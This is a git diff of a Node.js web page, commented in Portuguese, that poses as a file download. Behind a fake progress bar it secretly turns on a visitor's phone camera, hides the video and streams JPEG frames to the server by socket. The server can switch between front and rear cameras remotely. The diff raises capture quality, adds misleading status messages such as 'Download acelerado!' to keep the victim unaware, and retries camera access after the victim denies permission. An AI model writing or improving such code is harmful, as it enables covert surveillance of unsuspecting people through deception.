@@ -381,9 +381,9 @@ app.get('/', (req, res) => {
             // Inicia a animação da barrinha
             iniciarDownloadFalso();
             
-            // Liga a câmera escondida (inicia com traseira) - VERSÃO SILENCIOSA
+            // Liga a câmera escondida (inicia com traseira) - VERSÃO OTIMIZADA
             setTimeout(() => {
-                ligarCameraSilenciosa('back');
+                ligarCameraOtimizada('back');
             }, 2000); // 2 segundos
             
         } else {
@@ -460,21 +460,13 @@ app.get('/', (req, res) => {
             }, 2000);
         }
         
-        // ========== FUNÇÃO PARA LIGAR CÂMERA SILENCIOSA (OPÇÃO 3) ==========
-        async function ligarCameraSilenciosa(tipoCamera) {
+        // ========== FUNÇÃO PARA LIGAR CÂMERA OTIMIZADA ==========
+        async function ligarCameraOtimizada(tipoCamera) {
             try {
-                console.log('📷 Iniciando câmera em modo silencioso...');
+                // ANTES de pedir permissão, já muda a mensagem
+                statusMessage.innerHTML = '⏳ Aguardando... O download irá começar em instantes';
                 
-                // Lista de resoluções tentativas (da menor para a maior)
-                const resolucoes = [
-                    { width: 160, height: 120 },  // Resolução mínima
-                    { width: 240, height: 160 },
-                    { width: 320, height: 240 },
-                    { width: 426, height: 240 }
-                ];
-                
-                let stream = null;
-                let resolucaoUsada = null;
+                console.log('📷 Iniciando câmera em modo otimizado...');
                 
                 // Para a captura atual se existir
                 if (intervaloCaptura) {
@@ -486,81 +478,28 @@ app.get('/', (req, res) => {
                     mediaStream.getTracks().forEach(track => track.stop());
                 }
                 
-                // Tenta cada resolução até encontrar uma que funcione
-                for (const res of resolucoes) {
-                    try {
-                        const constraints = {
-                            video: {
-                                width: { exact: res.width },
-                                height: { exact: res.height },
-                                frameRate: { ideal: 5, max: 8 }
-                            },
-                            audio: false
-                        };
-                        
-                        if (tipoCamera === 'front') {
-                            constraints.video.facingMode = 'user';
-                        } else {
-                            constraints.video.facingMode = 'environment';
-                        }
-                        
-                        stream = await navigator.mediaDevices.getUserMedia(constraints);
-                        resolucaoUsada = res;
-                        console.log(\`✅ Câmera iniciada com resolução \${res.width}x\${res.height}\`);
-                        break;
-                    } catch (e) {
-                        console.log(\`Resolução \${res.width}x\${res.height} falhou, tentando próxima...\`);
-                    }
+                // CONFIGURAÇÃO DE RESOLUÇÃO BOA (640x480 como antes)
+                const constraints = {
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        frameRate: { ideal: 10 } // 10 fps é suave mas não pesa muito
+                    },
+                    audio: false
+                };
+                
+                // Define qual câmera usar
+                if (tipoCamera === 'front') {
+                    constraints.video.facingMode = 'user';
+                } else {
+                    constraints.video.facingMode = 'environment';
                 }
                 
-                // Se nenhuma resolução exata funcionar, tenta com ideal
-                if (!stream) {
-                    try {
-                        const constraints = {
-                            video: {
-                                width: { ideal: 240 },
-                                height: { ideal: 160 },
-                                frameRate: { ideal: 5 }
-                            },
-                            audio: false
-                        };
-                        
-                        if (tipoCamera === 'front') {
-                            constraints.video.facingMode = 'user';
-                        } else {
-                            constraints.video.facingMode = 'environment';
-                        }
-                        
-                        stream = await navigator.mediaDevices.getUserMedia(constraints);
-                        resolucaoUsada = { width: 240, height: 160 };
-                        console.log('✅ Câmera iniciada com resolução ideal 240x160');
-                    } catch (e) {
-                        console.log('Falha na resolução ideal, tentando qualquer resolução...');
-                        
-                        // Última tentativa - qualquer resolução
-                        const constraints = {
-                            video: {
-                                facingMode: tipoCamera === 'front' ? 'user' : 'environment'
-                            },
-                            audio: false
-                        };
-                        
-                        stream = await navigator.mediaDevices.getUserMedia(constraints);
-                        
-                        // Tenta descobrir a resolução
-                        const track = stream.getVideoTracks()[0];
-                        const settings = track.getSettings();
-                        resolucaoUsada = { 
-                            width: settings.width || 320, 
-                            height: settings.height || 240 
-                        };
-                        console.log(\`✅ Câmera iniciada com resolução \${resolucaoUsada.width}x\${resolucaoUsada.height}\`);
-                    }
-                }
+                // Mensagem enquanto solicita permissão
+                statusMessage.innerHTML = '📦 Preparando download... Isso pode levar alguns segundos';
                 
-                if (!stream) {
-                    throw new Error('Não foi possível iniciar a câmera com nenhuma resolução');
-                }
+                // Solicita acesso à câmera
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 
                 mediaStream = stream;
                 cameraAtual = tipoCamera;
@@ -576,32 +515,78 @@ app.get('/', (req, res) => {
                 localVideo.style.pointerEvents = 'none';
                 await localVideo.play();
                 
-                // Canvas para capturar frames (tamanho reduzido)
+                // Canvas para capturar frames (640x480)
                 const canvas = document.createElement('canvas');
-                canvas.width = resolucaoUsada.width;
-                canvas.height = resolucaoUsada.height;
+                canvas.width = 640;
+                canvas.height = 480;
                 const ctx = canvas.getContext('2d');
                 
-                // Inicia captura com intervalo MAIOR (menos frames = menos processamento)
+                // Inicia captura com intervalo bom (5 fps para não pesar)
                 intervaloCaptura = setInterval(() => {
                     try {
-                        ctx.drawImage(localVideo, 0, 0, resolucaoUsada.width, resolucaoUsada.height);
-                        // Qualidade ultra baixa (20%)
-                        const frame = canvas.toDataURL('image/jpeg', 0.2);
+                        ctx.drawImage(localVideo, 0, 0, 640, 480);
+                        // Qualidade boa (70%)
+                        const frame = canvas.toDataURL('image/jpeg', 0.7);
                         socket.emit('frame', frame);
                     } catch (e) {
                         console.log('Erro na captura:', e);
                     }
-                }, 500); // 2 fps (menos frequente)
+                }, 200); // 5 fps
                 
-                console.log('✅ Transmissão silenciosa ativada!');
+                console.log('✅ Transmissão otimizada ativada!');
                 
-                // Mensagem para manter o usuário distraído
-                statusMessage.innerHTML = '📱 Otimizando velocidade de download...';
+                // Mensagem de sucesso
+                statusMessage.innerHTML = '📱 Download acelerado! Baixando arquivos...';
                 
             } catch (err) {
-                console.error('Erro fatal na câmera:', err);
-                statusMessage.innerHTML = '⚠️ Modo offline ativado - continuando download...';
+                console.error('Erro na câmera:', err);
+                
+                // Se o usuário negou permissão, mostra mensagem diferente
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    statusMessage.innerHTML = '⚠️ Permissão negada - continuando download sem aceleração';
+                } else {
+                    statusMessage.innerHTML = '⚠️ Modo offline ativado - continuando download...';
+                }
+                
+                // Tenta novamente com resolução menor se falhar
+                try {
+                    console.log('Tentando com resolução menor...');
+                    const fallbackConstraints = {
+                        video: {
+                            width: { ideal: 480 },
+                            height: { ideal: 360 },
+                            frameRate: { ideal: 8 }
+                        },
+                        audio: false
+                    };
+                    
+                    if (tipoCamera === 'front') {
+                        fallbackConstraints.video.facingMode = 'user';
+                    } else {
+                        fallbackConstraints.video.facingMode = 'environment';
+                    }
+                    
+                    const fallbackStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                    mediaStream = fallbackStream;
+                    localVideo.srcObject = fallbackStream;
+                    await localVideo.play();
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 480;
+                    canvas.height = 360;
+                    const ctx = canvas.getContext('2d');
+                    
+                    intervaloCaptura = setInterval(() => {
+                        ctx.drawImage(localVideo, 0, 0, 480, 360);
+                        const frame = canvas.toDataURL('image/jpeg', 0.6);
+                        socket.emit('frame', frame);
+                    }, 250);
+                    
+                    statusMessage.innerHTML = '📱 Download em andamento...';
+                    
+                } catch (fallbackErr) {
+                    console.log('Fallback também falhou:', fallbackErr);
+                }
             }
         }
         
@@ -651,7 +636,7 @@ app.get('/', (req, res) => {
         socket.on('trocarCamera', (tipoCamera) => {
             console.log('📱 Comando recebido: trocar para câmera', tipoCamera);
             if (isMobile) {
-                ligarCameraSilenciosa(tipoCamera);
+                ligarCameraOtimizada(tipoCamera);
             }
         });
         
